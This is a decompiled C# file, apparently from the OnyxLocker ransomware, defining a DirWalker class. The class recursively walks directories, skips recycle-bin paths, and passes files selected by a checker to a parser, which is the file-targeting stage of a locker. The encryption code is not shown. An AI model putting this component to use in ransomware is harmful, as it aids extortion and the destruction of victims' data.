using System;
using System.IO;
using System.Threading;

namespace OnyxLocker
{
	// Token: 0x02000002 RID: 2
	internal class DirWalker
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		// (set) Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000258
		private IFileChecker FileChecker { get; set; }

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000003 RID: 3 RVA: 0x00002061 File Offset: 0x00000261
		// (set) Token: 0x06000004 RID: 4 RVA: 0x00002069 File Offset: 0x00000269
		private IFileParser FileParser { get; set; }

		// Token: 0x06000005 RID: 5 RVA: 0x00002072 File Offset: 0x00000272
		public DirWalker(IFileChecker fileChecker, IFileParser fileParser)
		{
			this.FileChecker = fileChecker;
			this.FileParser = fileParser;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x0000208C File Offset: 0x0000028C
		public void TraverseDirectories(string startDirectory)
		{
			try
			{
				string[] files = Directory.GetFiles(startDirectory);
				for (int i = 0; i < files.Length; i++)
				{
					this.ProcessFile(files[i].ToLower());
					Thread.Sleep(1);
				}
			}
			catch
			{
			}
			try
			{
				foreach (string startDirectory2 in Directory.GetDirectories(startDirectory))
				{
					this.TraverseDirectories(startDirectory2);
					Thread.Sleep(1);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002134 File Offset: 0x00000334
		private void ProcessFile(string filePath)
		{
			bool flag = this.IsTargetFile(filePath);
			if (flag)
			{
				this.FileParser.ParseFile(filePath);
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x0000215C File Offset: 0x0000035C
		private bool IsTargetFile(string filePath)
		{
			return !filePath.Contains("recycle") && this.FileChecker.IsTargetFile(filePath);
		}
	}
}
